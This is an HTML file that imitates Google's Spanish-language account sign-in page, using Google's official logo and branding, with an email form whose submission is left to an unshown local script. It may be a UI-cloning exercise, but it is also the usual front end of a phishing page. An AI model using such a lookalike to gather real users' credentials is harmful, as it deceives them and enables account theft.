<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Iniciar sesión - Google Cuentas</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <div class="box">
      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" class="logo" />
      <h1>Iniciar sesión</h1>
      <p>Usa tu Cuenta de Google</p>
      <form id="loginForm">
        <input type="email" id="email" placeholder="Correo electrónico o teléfono" required />
        <div class="actions">
          <a href="#">¿Has olvidado tu correo electrónico?</a>
        </div>
        <p class="info">¿No es tu ordenador? Usa el modo de invitado para navegar de forma privada. <a href="#">Más información</a></p>
        <div class="bottom-actions">
          <a href="#" class="create-account">Crear cuenta</a>
          <button type="submit">Siguiente</button>
        </div>
      </form>
    </div>
    <footer>
      <select>
        <option>Español (Latinoamérica)</option>
        <option>English</option>
        <option>Português (Brasil)</option>
      </select>
      <div class="footer-links">
        <a href="#">Ayuda</a>
        <a href="#">Privacidad</a>
        <a href="#">Términos</a>
      </div>
    </footer>
  </div>
  <script src="script.js"></script>
</body>
</html>
